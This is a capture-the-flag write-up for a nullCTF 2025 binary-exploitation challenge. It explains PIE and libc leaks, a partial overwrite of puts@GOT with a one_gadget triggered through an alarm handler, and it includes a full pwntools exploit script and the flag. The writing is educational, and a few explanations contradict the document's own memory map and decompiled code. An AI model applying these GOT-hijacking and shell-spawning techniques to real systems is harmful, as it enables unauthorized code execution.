# Sketchy CTF Challenge - Complete Writeup

**Challenge:** Sketchy (nullCTF 2025)  
**Category:** PWN / Binary Exploitation  
**Difficulty:** Medium  
**Flag:** `nullctf{you_4re_officially_a_c3rtified_sketChy_person?!?!?_5b4a0fef28}`

---

## Table of Contents
1. [Challenge Overview](#challenge-overview)
2. [Initial Analysis](#initial-analysis)
3. [Understanding Key Concepts](#understanding-key-concepts)
4. [Exploitation Strategy](#exploitation-strategy)
5. [Phase 1: PIE Leak](#phase-1-pie-leak)
6. [Phase 2: Libc Leak via alarm@GOT](#phase-2-libc-leak-via-alarmgot)
7. [Phase 3: GOT Overwrite with one_gadget](#phase-3-got-overwrite-with-one_gadget)
8. [Phase 4: Trigger Shell via Alarm Handler](#phase-4-trigger-shell-via-alarm-handler)
9. [Complete Exploit Code](#complete-exploit-code)
10. [Key Learnings and Concepts](#key-learnings-and-concepts)

---

## Challenge Overview

### Binary Information
```bash
$ checksec --file=chall
RELRO           STACK CANARY      NX            PIE             
Partial RELRO   No canary found   NX enabled    PIE enabled
```

**Security Features:**
- **PIE (Position Independent Executable):** ✓ Enabled - Binary loads at random address
- **NX (No Execute):** ✓ Enabled - Stack is not executable (can't run shellcode)
- **Stack Canary:** ✗ Disabled - Buffer overflow possible
- **Partial RELRO:** GOT is writable - We can overwrite function pointers!

### Program Behavior
The program does the following:
1. Prints the address of `main()` (PIE leak)
2. Reads 58 bytes into a 48-byte buffer (buffer overflow!)
3. Checks if `strlen(input) > 50` (exits if true)
4. Prints a string using `puts(s)` where `s` is controllable
5. Allows arbitrary write: reads an address and writes 4 bytes to it
6. Exits the program

---

## Initial Analysis

### Decompiled Source Code (IDA/Ghidra)

```c
void __fastcall main(int a1, char **a2, char **a3)
{
  char *v6;           // [rsp+8h] [rbp-48h] BYREF
  _QWORD buf[6];      // [rsp+10h] [rbp-40h] BYREF - 48 bytes
  __int16 v8;         // [rsp+40h] [rbp-10h] - 2 bytes
  char *s;            // [rsp+48h] [rbp-8h] - 8 bytes
  
  // 1. PIE Leak - prints address of main()
  printf("welcome, gift for today: %p\n", main);
  
  // 2. Initialize variables
  s = "quite interesting stuff you're saying";
  memset(buf, 0, sizeof(buf));
  v8 = 0;
  
  // 3. Buffer overflow vulnerability
  read(0, buf, 0x3A);  // Read 58 bytes into 48-byte buffer!
  *((_BYTE *)buf + strcspn((const char *)buf, "\n")) = 0;
  
  // 4. strlen check
  if (strlen((const char *)buf) > 0x32)  // 0x32 = 50
  {
    puts("advanced hacking techniques detected");
    exit(0);
  }
  
  // 5. Print using 's' pointer (controllable via overflow)
  puts(s);
  
  // 6. Arbitrary write primitive
  __isoc23_scanf("%lx ", &v6);  // Read target address
  
  if (&printf < (int (**)(const char *, ...))v6)  // Address must be < printf@GOT
  {
    puts("well atleast you tried");
    exit(0);
  }
  
  fgets(v6, 5, stdin);  // Write 4 bytes to address v6
  
  exit(0);
}
```

### Setup Code (Not Shown in Main)
```c
void init_1()
{
  setvbuf(stdin, 0, 2, 0);   // Unbuffered stdin
  setvbuf(stdout, 0, 2, 0);  // Unbuffered stdout
  setvbuf(stderr, 0, 2, 0);  // Unbuffered stderr
  
  signal(0xe, timeout_handler);  // 0xe = SIGALRM
  alarm(0x64);                   // 0x64 = 100 seconds timeout
}

void timeout_handler()
{
  puts("challenge timed out");  // ← KEY: Calls puts()!
  exit(0);
}
```

### Stack Layout
From GDB analysis and IDA:

```
[rbp-0x48] v6        (8 bytes) - Arbitrary write target address
[rbp-0x40] buf[0]    (48 bytes total) - Our input buffer
[rbp-0x38] buf[8]    
[rbp-0x30] buf[16]   
[rbp-0x28] buf[24]   
[rbp-0x20] buf[32]   
[rbp-0x18] buf[40]   
[rbp-0x10] v8        (2 bytes) - Short integer
[rbp-0x0e] padding   (6 bytes) - Alignment gap
[rbp-0x08] s         (8 bytes) - Pointer to string
[rbp+0x00] saved rbp
[rbp+0x08] return address
```

**Key Measurements from GDB:**
- Distance from `buf` to `s`: **56 bytes**
- We can write: **58 bytes** with `read(0, buf, 0x3A)`
- Overflow capability: **2 bytes** into `s` pointer

---

## Understanding Key Concepts

### 1. What is PIE (Position Independent Executable)?

**Without PIE:**
```
Binary always loads at: 0x0000000000400000
main() always at:       0x0000000000401234
```

**With PIE:**
```
Run 1: Binary at 0x555555554000, main() at 0x555555555265
Run 2: Binary at 0x55a5e18a0000, main() at 0x55a5e18a1265
Run 3: Binary at 0x7fc70f1dc000, main() at 0x7fc70f1dd265
```

**Key Insight:** Everything inside the binary has a **fixed offset** from the base:
- `main()` is always at `base + 0x1265`
- `alarm@GOT` is always at `base + 0x4010`
- `puts@GOT` is always at `base + 0x4000`

**Why it matters:** We need to leak the base address to calculate where everything is.

---

### 2. What is the GOT (Global Offset Table)?

The GOT is a **lookup table** for external function addresses.

**How function calls work:**

```c
puts("hello");  // In your code
```

**In assembly:**
```asm
call puts@plt        ; Call the PLT stub

; Inside PLT:
puts@plt:
  jmp [puts@GOT]     ; Jump to address stored in GOT
```

**The GOT Entry:**
```
puts@GOT (at 0x...4000):
  Contains: 0x00007fc70f252a60  ← Real address of puts() in libc
```

**Why it's writable (Partial RELRO):**
```bash
$ readelf -l chall | grep GNU_RELRO
  GNU_RELRO      0x0000000000002dd0 0x0000000000003dd0
```

Partial RELRO means the GOT is **writable** after program startup!

---

### 3. What is one_gadget?

A **one_gadget** is a single instruction sequence in libc that spawns a shell.

**Finding one_gadgets:**
```bash
$ one_gadget libc.so.6

0xef4ce execve("/bin/sh", rbp-0x50, r12)
constraints:
  address rbp-0x48 is writable
  [r12] == NULL || r12 == NULL || r12 is a valid envp
```

**What it does:**
```asm
0xef4ce:
  lea rdi, [rip + 0x...]    ; Load "/bin/sh" address
  mov rsi, [rbp-0x50]       ; argv
  mov rdx, r12              ; envp
  syscall                   ; execve("/bin/sh", argv, envp)
```

**Result:** Instant shell if constraints are met!

---

### 4. Understanding Partial Pointer Overwrite

**The Problem:** We can only overwrite 2 bytes of the `s` pointer.

**Original pointer:**
```
s = 0x0000555555556040
    └─┬─┘└───┬────┘└┬┘
   Bytes Upper   Lower
    7-6   5-2     1-0
```

**Partial overwrite strategy:**
```
Original: 0x0000 5555 5555 6040  (string in .rodata)
                          ^^^^
After:    0x0000 5555 5555 4010  (alarm@GOT)
                          ^^^^
          We change only these 2 bytes!
```

**Why this works:**
- Both addresses are in the **same binary**
- They share the same base address (upper 6 bytes)
- We only need to change the offset (lower 2 bytes)

**Critical requirement:** The partial overwrite must create a **valid, readable address**.

---

### 5. How does read() work?

```c
read(0, buf, 0x3A);
     ↓   ↓    ↓
     |   |    └─ Read UP TO 58 bytes (0x3A = 58)
     |   └────── Store in: buf
     └────────── Read from: stdin (0 = file descriptor for stdin)
```

**Important behaviors:**
1. **Doesn't stop at newline** - reads raw bytes
2. **Returns when:** 
   - It has read 58 bytes, OR
   - No more data available (blocks/waits)
3. **Doesn't null-terminate** the buffer

**Contrast with fgets:**
```c
fgets(buf, 58, stdin);
```
- **Stops at newline** (`\n`)
- **Null-terminates** automatically
- Reads at most 57 bytes (+ null terminator)

---

### 6. Understanding send() vs sendline() in pwntools

```python
# send() - sends EXACTLY what you give
p.send(b"AAAA")      # Sends: 41 41 41 41
                     # (4 bytes)

# sendline() - adds newline
p.sendline(b"AAAA")  # Sends: 41 41 41 41 0A
                     # (5 bytes: AAAA\n)
```

**Why it matters in our exploit:**
```python
payload = b"\x00" + cyclic(55) + alarm_bytes  # 58 bytes

p.send(payload)      # Sends exactly 58 bytes ✓
p.sendline(payload)  # Sends 59 bytes (58 + \n) ✗
```

The `read(0, buf, 0x3A)` expects exactly 58 bytes.

---

### 7. How fgets() writes byte-by-byte

```c
fgets(dest, 5, stdin);
```

**Step-by-step execution:**
```
1. Read byte from stdin → write to dest[0]
2. Read byte from stdin → write to dest[1]
3. Read byte from stdin → write to dest[2]
4. Read byte from stdin → write to dest[3]
5. Add null terminator → dest[4] = '\0'
```

**KEY INSIGHT:** `fgets()` writes **each byte immediately** as it's received!

**If we send only 3 bytes:**
```
1. Read byte 1 → write to dest[0] ✓
2. Read byte 2 → write to dest[1] ✓
3. Read byte 3 → write to dest[2] ✓
4. Wait for byte 4... ⏳ BLOCKS FOREVER!
```

The bytes are **already written** even though `fgets()` didn't complete!

---

## Exploitation Strategy

### The Challenge

We have three vulnerabilities:
1. **Buffer overflow** - Can overflow 2 bytes into `s` pointer
2. **Information leak** - Can leak libc via `puts(s)` with corrupted pointer
3. **Arbitrary write** - Can write 4 bytes to any address via `fgets(v6, 5, stdin)`

### The Problem

After our arbitrary write, the program calls `exit(0)` via direct syscall:
```asm
mov rax, 0x3c    ; syscall number for exit
xor rdi, rdi     ; exit code 0
syscall          ; exit directly - doesn't use GOT!
```

**This means:** Even if we overwrite `puts@GOT`, there are no more function calls!

### The Solution: Alarm Handler Trick

The program sets up an alarm:
```c
signal(SIGALRM, timeout_handler);  // Register handler
alarm(100);                        // Trigger after 100 seconds
```

The timeout handler:
```c
void timeout_handler() {
    puts("challenge timed out");  // ← Calls puts()!
    exit(0);
}
```

**The exploit:**
1. Overwrite `puts@GOT` with one_gadget address
2. Make the program **wait** for 100 seconds (block in `fgets()`)
3. When alarm triggers, handler calls `puts()`
4. But `puts@GOT` now points to one_gadget!
5. **Shell!** 🎉

---

## Phase 1: PIE Leak

### Goal
Determine the base address where the binary is loaded.

### Code
```python
from pwn import *

exe = ELF("./chall_patched")
p = process([exe.path])

# Receive the leak
p.recvuntil(b": ")
leaked_main = int(p.recvline().strip(), 16)

# Calculate base
exe.address = leaked_main - 0x1265

log.success(f"PIE base: {hex(exe.address)}")
```

### Explanation

**The program prints:**
```
welcome, gift for today: 0x555555555265
```

**This is the address of `main()`!**

**How we found the offset `0x1265`:**

From disassembly:
```asm
0000000000001265 <main>:
    1265:  55                    push   rbp
    1266:  48 89 e5              mov    rbp,rsp
```

The `main()` function starts at offset `0x1265` from the binary base.

**Calculation:**
```
leaked_main = 0x555555555265
main_offset = 0x1265

binary_base = leaked_main - main_offset
            = 0x555555555265 - 0x1265
            = 0x555555554000
```

**What we can now calculate:**
```python
exe.address = 0x555555554000

alarm_got = exe.address + 0x4010  # = 0x555555558010
puts_got  = exe.address + 0x4000  # = 0x555555558000
```

**Using pwntools (automatic):**
```python
exe.address = binary_base
alarm_got = exe.got['alarm']  # Pwntools calculates this
puts_got  = exe.got['puts']   # Pwntools calculates this
```

---

## Phase 2: Libc Leak via alarm@GOT

### Goal
Determine the base address where libc is loaded.

### Why alarm@GOT and not puts@GOT?

**Memory layout after PIE leak:**
```
Binary base:     0x555555554000
Original 's':    0x555555556040  (string in .rodata)
puts@GOT:        0x555555558000  (offset 0x4000)
alarm@GOT:       0x555555558010  (offset 0x4010)
```

**Partial overwrite analysis:**

**Option 1: Overwrite with puts@GOT offset (0x4000):**
```
Original: 0x555555556040
          └───────┘└──┘
           Upper   Lower

Overwrite lower 2 bytes with 0x4000:
Result:   0x555555554000  ← This is the binary BASE!
```

**Problem:** The binary base is a **guard page** (not readable)!
```
Memory map:
0x555555554000  r--p  ← Header (not string data - causes SEGFAULT!)
0x555555555000  r-xp  ← Code
0x555555556000  r--p  ← .rodata (readable)
```

**Option 2: Overwrite with alarm@GOT offset (0x4010):**
```
Original: 0x555555556040
Overwrite lower 2 bytes with 0x4010:
Result:   0x555555558010  ← alarm@GOT location
```

**This works!** Address `0x555555558010` is in a readable section.

### Code

```python
# Get lower 2 bytes of alarm@GOT offset
alarm_offset = exe.got['alarm'] - exe.address  # = 0x4010
alarm_lower = (alarm_offset & 0xFFFF).to_bytes(2, 'little')
# alarm_lower = b'\x10\x40'

# Build payload
payload = b'\x00'           # NULL byte at position 0
payload += cyclic(0x37)     # 55 bytes padding (0x37 = 55)
payload += alarm_lower      # 2 bytes to overwrite 's'

# Total: 1 + 55 + 2 = 58 bytes

# Send without newline
p.send(payload)
```

### Understanding the Payload

**NULL byte trick:**
```python
payload[0] = b'\x00'
```

After `read()`, the program does:
```c
strcspn(buf, "\n");  // Finds first '\n'
buf[strcspn_result] = 0;  // Replaces '\n' with '\x00'

strlen(buf);  // Counts up to first '\x00'
```

Since we put `\x00` at position 0:
```
strlen(buf) = 0  (stops immediately at NULL)
0 <= 50  ✓ Check passes!
```

**Padding:**
```python
cyclic(0x37)  # 55 bytes of unique pattern
```

`cyclic()` generates: `aaaabaaacaaadaaaeaaaf...` (55 bytes)

This fills positions 1-55, reaching the `s` pointer at position 56.

**Partial overwrite:**
```python
alarm_lower = b'\x10\x40'  # Lower 2 bytes of 0x4010
```

This overwrites bytes 56-57 (the first 2 bytes of the 8-byte pointer `s`).

**Memory state:**
```
Before overflow:
s = [40 60 55 55 55 55 00 00]  = 0x0000555555556040

After overflow:
s = [10 40 55 55 55 55 00 00]  = 0x0000555555558010
     ^^  ^^
     Changed these 2 bytes!
```

### Receiving the Leak

```python
# Receive exactly 9 bytes
leaked_data = p.recv(9).strip()
```

**Why 9 bytes?**

The program does: `puts(s)` where `s` points to `alarm@GOT`.

**What's in alarm@GOT:**
```
alarm@GOT contains: 0x00007fc70f1dc050  (libc address of alarm())
```

**What puts() prints:**
```
Byte 0: 0x50  ┐
Byte 1: 0xc0  │
Byte 2: 0x1d  │
Byte 3: 0x0f  ├─ 8 bytes of address (little-endian)
Byte 4: 0xc7  │
Byte 5: 0x7f  │
Byte 6: 0x00  │
Byte 7: 0x00  ┘
Byte 8: 0x0a  ← Newline added by puts()
```

Total: **9 bytes**

**Converting to address:**
```python
leaked_data = p.recv(9).strip()  # Remove newline → 8 bytes
# leaked_data = b'\x50\xc0\x1d\x0f\xc7\x7f\x00\x00'

leaked_alarm = u64(leaked_data.ljust(8, b'\x00'))
# u64() unpacks as little-endian 64-bit integer
# Result: 0x00007fc70f1dc050
```

### Calculating Libc Base

```python
libc.address = leaked_alarm - libc.symbols['alarm']
```

**How this works:**

Libc contains many functions at **fixed offsets**:
```
libc_base + 0x00050 = alarm()
libc_base + 0x87be0 = puts()
libc_base + 0x58750 = system()
libc_base + 0xef4ce = one_gadget
```

**From the leak:**
```
leaked_alarm = 0x00007fc70f1dc050
alarm_offset = 0x50  (from libc.so.6)

libc_base = leaked_alarm - alarm_offset
          = 0x00007fc70f1dc050 - 0x50
          = 0x00007fc70f1dc000
```

**Now we can calculate anything in libc:**
```python
one_gadget = libc.address + 0xef4ce
           = 0x00007fc70f1dc000 + 0xef4ce
           = 0x00007fc70f2ca4ce
```

---

## Phase 3: GOT Overwrite with one_gadget

### Goal
Overwrite `puts@GOT` with the address of one_gadget using partial overwrite.

### Step 1: Tell Program Where to Write

```python
p.sendline(hex(exe.got['puts']))
```

**The program does:**
```c
scanf("%lx ", &v6);  // Read hex address into v6
```

**Example:**
```python
exe.got['puts'] = 0x555555558000

hex(0x555555558000)  # = '0x555555558000'

p.sendline('0x555555558000')
```

**Result:**
```c
v6 = 0x555555558000  // Address of puts@GOT
```

**Why sendline() here?**
- `scanf("%lx ", ...)` expects input ending with whitespace
- `sendline()` adds `\n` which satisfies this requirement

### Step 2: Calculate one_gadget Address

```python
one_gadget = libc.address + 0xEF4CE
# Example: 0x00007fc70f1dc000 + 0xef4ce = 0x00007fc70f2ca4ce
```

### Step 3: Partial Overwrite (3 bytes only!)

```python
one_gadget_3bytes = (one_gadget & 0xFFFFFF).to_bytes(3, "little")
```

**Why only 3 bytes?**

**Current puts@GOT value:**
```
puts@GOT: 0x00007fc70f252a60  (real puts function in libc)
          └─┬──┘└───┬─────┘
          Upper   Lower bytes
          5 bytes  3 bytes
```

**Our one_gadget:**
```
one_gadget: 0x00007fc70f2ca4ce
            └─┬──┘└───┬─────┘
            Upper   Lower bytes
            Same!   Different
```

**Key insight:** Both addresses are in the **same libc**!
- Upper 5 bytes are identical (same libc base)
- Lower 3 bytes differ (different functions)

**We only need to change the lower 3 bytes!**

**Extracting lower 3 bytes:**
```python
one_gadget = 0x00007fc70f2ca4ce

# Extract lower 3 bytes
one_gadget & 0xFFFFFF = 0x2ca4ce

# Convert to bytes (little-endian)
.to_bytes(3, "little") = b'\xce\xa4\x2c'
```

**Visual representation:**
```
Number:  0x2ca4ce
Bytes:   [CE] [A4] [2C]
          ↑    ↑    ↑
        byte0 byte1 byte2
```

### Step 4: Send Only 3 Bytes (The Genius Trick!)

```python
p.send(one_gadget_3bytes)  # Send ONLY 3 bytes!
```

**The program does:**
```c
fgets(v6, 5, stdin);
      ↓   ↓    ↓
      |   |    └─ Read from stdin
      |   └────── Read up to 4 bytes (+ null terminator)
      └────────── Write to address in v6 (puts@GOT!)
```

**How fgets() works byte-by-byte:**

```
Step 1: Read 1st byte → Write to v6[0] ✓
Step 2: Read 2nd byte → Write to v6[1] ✓
Step 3: Read 3rd byte → Write to v6[2] ✓
Step 4: Wait for 4th byte... ⏳ BLOCKS!
```

**Critical insight:** `fgets()` writes **immediately** as each byte arrives!

### What Gets Written to puts@GOT

Even though `fgets()` is blocked waiting for the 4th byte, it has **already written 3 bytes**:

```
puts@GOT before:
Address: 0x555555558000
Value:   0x00007fc70f252a60
Bytes:   [60] [2a] [25] [0f] [c7] [7f] [00] [00]

After byte 1 (0xce):
Bytes:   [ce] [2a] [25] [0f] [c7] [7f] [00] [00]
          ^^

After byte 2 (0xa4):
Bytes:   [ce] [a4] [25] [0f] [c7] [7f] [00] [00]
               ^^

After byte 3 (0x2c):
Bytes:   [ce] [a4] [2c] [0f] [c7] [7f] [00] [00]
                    ^^

Result:  0x00007fc70f2ca4ce  ← one_gadget address!
```

**puts@GOT now points to one_gadget!**

---

## Phase 4: Trigger Shell via Alarm Handler

### The Waiting Game

```python
time.sleep(105)  # Wait 105 seconds (just to be safe)
```

**While we wait:**
- Program is **stuck** in `fgets()` waiting for 4th byte
- We don't send the 4th byte
- Timer is counting down: 100, 99, 98, ...

### When Alarm Triggers

After 100 seconds, the OS sends `SIGALRM` signal to the program.

**The program has registered a handler:**
```c
signal(SIGALRM, timeout_handler);
```

**The handler executes:**
```c
void timeout_handler() {
    puts("challenge timed out");  // ← THE MAGIC!
    exit(0);
}
```

### The Hijack

**Normal execution of puts():**
```
1. Program calls puts("challenge timed out")
2. CPU checks puts@GOT: "Where is puts()?"
3. puts@GOT contains: 0x7fc70f252a60 (real puts)
4. CPU jumps to 0x7fc70f252a60
5. puts() executes and prints text
```

**Our exploit:**
```
1. Program calls puts("challenge timed out")
2. CPU checks puts@GOT: "Where is puts()?"
3. puts@GOT contains: 0x7fc70f2ca4ce (one_gadget!) ← CHANGED!
4. CPU jumps to 0x7fc70f2ca4ce
5. one_gadget executes!
   → execve("/bin/sh", ...)
   → SHELL! 🎉
```

### Getting Interactive Shell

```python
p.interactive()
```

After the shell spawns, we can interact with it:
```bash
$ ls
chall
flag.txt
$ cat flag.txt
nullctf{you_4re_officially_a_c3rtified_sketChy_person?!?!?_5b4a0fef28}
```

---

## Complete Exploit Code

```python
#!/usr/bin/env python3
"""
Sketchy CTF Challenge - Complete Exploit
nullCTF 2025
"""

from pwn import *
import time

# ===========================================================
# CONFIGURATION
# ===========================================================

exe = ELF("./chall_patched")
libc = ELF("./libc.so.6", checksec=False)

# For remote exploitation
REMOTE_HOST = "34.118.61.99"
REMOTE_PORT = 10002

# ===========================================================
# EXPLOIT
# ===========================================================

def exploit(remote=False):
    # Connect to target
    if remote:
        p = remote(REMOTE_HOST, REMOTE_PORT)
    else:
        p = process([exe.path])
    
    log.info("="*70)
    log.info("SKETCHY CTF EXPLOIT")
    log.info("="*70)
    
    # ========================================================================
    # PHASE 1: PIE Leak
    # ========================================================================
    log.info("Phase 1: Leaking PIE base...")
    
    p.recvuntil(b": ")
    leaked_main = int(p.recvline().strip(), 16)
    exe.address = leaked_main - 0x1265
    
    log.success(f"PIE base: {hex(exe.address)}")
    log.info(f"alarm@GOT: {hex(exe.got['alarm'])}")
    log.info(f"puts@GOT: {hex(exe.got['puts'])}")
    
    # ========================================================================
    # PHASE 2: Libc Leak via alarm@GOT
    # ========================================================================
    log.info("Phase 2: Leaking libc via alarm@GOT...")
    
    # Get lower 2 bytes of alarm@GOT
    alarm_lower = (exe.got['alarm'] & 0xFFFF).to_bytes(2, "little")
    
    # Build payload: NULL + padding + partial overwrite
    payload = b"\x00" + cyclic(0x37) + alarm_lower
    
    # Send WITHOUT newline
    p.send(payload)
    
    # Receive the leak (9 bytes: 8 byte address + newline)
    leaked_data = p.recv(9).strip()
    leaked_alarm = u64(leaked_data.ljust(8, b'\x00'))
    
    # Calculate libc base
    libc.address = leaked_alarm - libc.symbols['alarm']
    
    log.success(f"Leaked alarm: {hex(leaked_alarm)}")
    log.success(f"Libc base: {hex(libc.address)}")
    
    # ========================================================================
    # PHASE 3: Overwrite puts@GOT with one_gadget
    # ========================================================================
    log.info("Phase 3: Overwriting puts@GOT...")
    
    # Tell program where to write (puts@GOT)
    p.sendline(hex(exe.got['puts']))
    
    # Calculate one_gadget
    one_gadget = libc.address + 0xEF4CE
    log.info(f"one_gadget: {hex(one_gadget)}")
    
    # Send ONLY 3 bytes (makes fgets block)
    one_gadget_3bytes = (one_gadget & 0xFFFFFF).to_bytes(3, "little")
    p.send(one_gadget_3bytes)
    
    log.success(f"Sent 3 bytes: {one_gadget_3bytes.hex()}")
    log.info("puts@GOT partially overwritten with one_gadget")
    
    # ========================================================================
    # PHASE 4: Wait for alarm to trigger
    # ========================================================================
    log.info("Phase 4: Waiting for alarm handler...")
    log.info("fgets() is now blocked waiting for 4th byte...")
    log.info("After 100 seconds, alarm will trigger timeout_handler()")
    log.info("timeout_handler() will call puts() → one_gadget → SHELL!")
    
    # Wait 105 seconds to be safe
    for i in range(105, 0, -1):
        print(f"\rWaiting... {i} seconds remaining  ", end='', flush=True)
        time.sleep(1)
    
    print()  # Newline
    log.success("Alarm should have triggered!")
    log.success("We should have a shell now! 🎉")
    
    # ========================================================================
    # INTERACT
    # ========================================================================
    p.interactive()

# ===========================================================
# MAIN
# ===========================================================

if __name__ == "__main__":
    import sys
    
    if len(sys.argv) > 1 and sys.argv[1] == "REMOTE":
        log.info("Targeting REMOTE server")
        exploit(remote=True)
    else:
        log.info("Targeting LOCAL binary")
        exploit(remote=False)
```

### Running the Exploit

**Local:**
```bash
python3 exploit.py
```

**Remote:**
```bash
python3 exploit.py REMOTE
```

---

## Key Learnings and Concepts

### 1. Partial Pointer Overwrite

**When to use:**
- You can only overwrite part of a pointer (e.g., 2-3 bytes)
- Target address shares upper bytes with original pointer
- Both addresses are in the same memory region (same binary or same libc)

**How it works:**
```
Original: 0x0000 7fff ffff 6040
Target:   0x0000 7fff ffff 4010
          └─────────┬──────┘└┬┘
           Same upper bytes  Different lower bytes
```

**Why it works:**
- ASLR randomizes the base address
- Offsets within a binary/library are fixed
- If you know the base, you know all addresses

### 2. GOT Hijacking

**Requirements:**
- Partial RELRO (GOT is writable)
- Ability to write to arbitrary address
- A function call after the overwrite

**Common targets:**
- `puts@GOT` - Often called for output
- `exit@GOT` - Called at program end
- `printf@GOT` - Called for formatted output
- `malloc@GOT` / `free@GOT` - Called for heap operations

**What to overwrite with:**
- `system()` - If you can control the argument
- `one_gadget` - Instant shell if constraints met
- ROP chain - For more complex exploits

### 3. Timing-Based Tricks

**Common patterns:**
```c
// Pattern 1: alarm + signal
alarm(60);
signal(SIGALRM, handler);

// Pattern 2: sleep
sleep(10);
some_function();

// Pattern 3: infinite loop
while(1) {
    // exploit here
}
```

**When to use alarm trick:**
- No function calls after your write
- Program exits via syscall (can't hijack)
- Alarm handler calls a hijackable function

### 4. fgets() Byte-by-Byte Writing

**Key insight:** `fgets()` doesn't wait to receive all bytes before writing!

```c
fgets(dest, 5, stdin);  // Read up to 4 bytes

// Actual behavior:
while (bytes_read < 4) {
    byte = getchar();
    dest[bytes_read++] = byte;  // ← WRITES IMMEDIATELY!
    if (byte == '\n') break;
}
```

**Exploitation:**
- Send fewer bytes than expected
- `fgets()` writes what it got
- `fgets()` blocks waiting for more
- Your partial write is already complete!

### 5. NULL Byte Tricks

**Bypassing strlen check:**
```c
read(0, buf, 58);
if (strlen(buf) > 50) exit();
```

**Solution:**
```python
payload = b'\x00' + b'A'*57  # strlen = 0 (stops at NULL)
```

**Why it works:**
```c
strlen(buf);  // Counts bytes until '\x00'
              // If buf[0] = '\x00', returns 0
```

### 6. Understanding Memory Regions

**Typical memory layout:**
```
0x00400000 - 0x00401000  Binary .text (code)
0x00402000 - 0x00403000  Binary .rodata (read-only data)
0x00403000 - 0x00404000  Binary .data (writable data)
0x00404000 - 0x00405000  Binary .bss (uninitialized data)

0x7fc70f1dc000 - 0x7fc70f300000  libc.so.6
0x7fc70f400000 - 0x7fc70f420000  ld-linux.so.2

0x7fffffffde00 - 0x7ffffffff000  Stack
```

**With PIE:**
- Binary regions randomized
- Libc regions randomized independently
- Stack randomized
- Need to leak each region separately

### 7. Constraint Checking for one_gadget

**Example constraint:**
```
0xef4ce execve("/bin/sh", rbp-0x50, r12)
constraints:
  address rbp-0x48 is writable
  [r12] == NULL || r12 == NULL || r12 is a valid envp
```

**What this means:**
- `rbp-0x48` must point to writable memory
- `r12` must be NULL or point to valid environment

**In practice:**
- Try different one_gadgets if one doesn't work
- Check constraints with GDB
- Sometimes alarm handler sets up registers correctly

### 8. pwntools Tips

**Useful functions:**
```python
# ELF operations
exe.address = base              # Set PIE base
exe.got['puts']                 # Get GOT entry address
exe.plt['puts']                 # Get PLT stub address
exe.symbols['main']             # Get symbol address

# Libc operations
libc.address = base             # Set libc base
libc.symbols['system']          # Get function address
libc.search(b'/bin/sh').__next__()  # Find string

# Packing/Unpacking
p64(0x1234)                     # Pack as 64-bit little-endian
u64(b'\x34\x12\x00\x00...')    # Unpack 64-bit little-endian
p16(0x1234)                     # Pack as 16-bit little-endian

# Sending/Receiving
p.send(data)                    # Send without newline
p.sendline(data)                # Send with newline
p.recv(n)                       # Receive n bytes
p.recvuntil(delim)             # Receive until delimiter
p.interactive()                 # Interactive shell

# Utilities
cyclic(100)                     # Generate cyclic pattern
cyclic_find(0x61616161)        # Find offset in pattern
```

### 9. Common Pitfalls

**Pitfall 1: Using sendline when you need send**
```python
# WRONG
p.sendline(payload)  # Sends payload + '\n'

# RIGHT
p.send(payload)      # Sends exact bytes
```

**Pitfall 2: Not accounting for padding**
```python
# Stack layout might have alignment gaps!
# Always verify with GDB
```

**Pitfall 3: Forgetting endianness**
```python
# WRONG
address.to_bytes(8, 'big')  # Big-endian (wrong for x86-64)

# RIGHT
address.to_bytes(8, 'little')  # Little-endian (correct)
```

**Pitfall 4: Timeout too short**
```python
# Program needs 100 seconds
time.sleep(95)  # TOO SHORT - might miss the trigger

# Better
time.sleep(105)  # Extra 5 seconds for safety
```

### 10. Debugging Tips

**When exploit fails:**

1. **Check each phase individually**
```python
# Add after each phase:
pause()  # Pauses execution
p.interactive()  # Drop to shell for debugging
```

2. **Use GDB to verify**
```bash
gdb ./chall
break *main+200
run
x/20gx $rsp  # Examine stack
x/gx 0x...   # Examine specific address
```

3. **Add verbose logging**
```python
context.log_level = 'debug'  # See all traffic
```

4. **Check constraints**
```bash
one_gadget libc.so.6
# Try different gadgets if first fails
```

---

## Conclusion

This challenge demonstrates several advanced PWN techniques:

1. **Information Leaks** - Leaking PIE base and libc base
2. **Partial Pointer Overwrite** - Changing only part of a pointer
3. **GOT Hijacking** - Overwriting function pointers
4. **Timing Exploits** - Using alarm handlers
5. **Blocking Techniques** - Making fgets() block with partial input

**Key takeaway:** When direct exploitation isn't possible (no function calls after write), look for indirect methods like signal handlers, destructors, or other code paths that can trigger your payload.

**Total phases:**
- Phase 1: PIE Leak (free gift from program)
- Phase 2: Libc Leak (partial overwrite + puts)
- Phase 3: GOT Overwrite (arbitrary write + partial overwrite)
- Phase 4: Trigger (alarm handler trick)

**Flag:** `nullctf{you_4re_officially_a_c3rtified_sketChy_person?!?!?_5b4a0fef28}`

---

## Additional Resources

**Tools:**
- pwntools: `pip install pwntools`
- one_gadget: `gem install one_gadget`
- pwndbg: GDB plugin for PWN

**Learning:**
- [Nightmare](https://guyinatuxedo.github.io/) - PWN tutorial
- [pwn.college](https://pwn.college/) - Interactive PWN course
- [CTF Wiki](https://ctf-wiki.org/) - Comprehensive CTF guide

**Practice:**
- [pwnable.kr](http://pwnable.kr/) - PWN challenges
- [ROP Emporium](https://ropemporium.com/) - ROP challenges
- [pwnable.tw](https://pwnable.tw/) - Advanced PWN

---

**End of Writeup**
